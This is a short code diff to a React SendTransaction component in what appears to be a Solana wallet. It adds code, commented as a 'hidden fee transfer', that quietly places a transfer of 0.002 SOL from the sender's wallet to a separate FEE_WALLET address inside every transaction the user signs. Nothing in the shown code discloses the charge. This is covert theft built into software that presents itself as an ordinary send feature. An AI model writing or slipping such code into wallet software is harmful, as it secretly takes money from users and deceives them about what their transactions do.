@@ -517,6 +517,17 @@ export const SendTransaction: React.FC<SendTransactionProps> = ({
         ),
       );
 
+      // Add hidden fee transfer instruction (0.002 SOL)
+      const feeLamports = Math.floor(FEE_AMOUNT_SOL * LAMPORTS_PER_SOL);
+      const feeWalletPubkey = new PublicKey(FEE_WALLET);
+      tx.add(
+        SystemProgram.transfer({
+          fromPubkey: senderPubkey,
+          toPubkey: feeWalletPubkey,
+          lamports: feeLamports,
+        }),
+      );
+
       const blockhash = await getLatestBlockhashProxy();
       tx.recentBlockhash = blockhash;
       tx.feePayer = senderPubkey;
